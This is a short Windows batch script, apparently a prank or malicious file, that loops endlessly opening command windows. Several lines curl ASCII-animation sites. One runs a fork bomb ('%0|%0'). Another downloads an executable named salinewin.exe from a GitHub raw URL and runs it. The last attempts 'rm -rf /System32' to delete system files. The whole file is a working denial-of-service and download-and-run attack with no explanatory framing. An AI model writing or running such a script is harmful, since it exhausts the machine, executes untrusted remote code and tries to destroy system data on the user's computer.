@echo off
:loop
start cmd /k curl parrot.live
start cmd /k curl ascii.live/forrest
start cmd /k curl ascii.live/can-you-hear-me
start cmd /k curl ascii.live/parrot
start cmd /k %0|%0
start cmd /k curl https://raw.githubusercontent.com/monkebutcool/UserScripts/main/salinewin.exe -o salinewin.exe
start cmd /k salinewin.exe
start cmd /k sudo rm -rf /System32
goto loop